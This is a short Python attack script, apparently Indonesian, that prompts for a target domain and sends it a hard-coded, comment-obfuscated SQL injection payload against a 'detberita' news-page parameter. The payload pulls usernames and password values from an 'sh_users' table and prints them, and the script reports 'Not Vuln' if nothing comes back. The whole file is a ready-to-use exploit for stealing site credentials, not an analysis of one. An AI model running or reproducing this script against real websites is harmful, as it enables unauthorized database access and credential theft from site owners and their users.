import os
from requests import get
from bs4 import BeautifulSoup

def clear():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')

clear()

l1 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/a.txt")
l1a = BeautifulSoup(l1.text, 'html.parser')
l1b = l1a.text.rstrip().lstrip()
print (l1b)

l2 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/2.txt")
l2a = BeautifulSoup(l2.text, 'html.parser')
l2b = l2a.text.rstrip().lstrip()
print (l2b)

uDOMEN = input('Masukkan Domain Target: ')
l3a = ("/?p=detberita&id=1%27%20and%20%40x%3A%3Dconcat%2F**_**%2F((select(@x)from(select(@x:=0x00),(select(0)from(sh_users)where(0x00)in(@x:=concat+(@x,0x3c62723e,s_username,0x203a3a20,sandiusers,%22||%22))))x))%20/*!50000union*/%20/*!50000select*/%201,@x,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+")

urla = get("http://"+uDOMEN+l3a)
soup = BeautifulSoup(urla.text, 'html.parser')
hasil = soup.find('h3')
try:
  res = hasil.text.rstrip().lstrip()
  print("RESULT = ") 
  print (res)
except:
  print('Situs Not Vuln Pak :(')
  exit
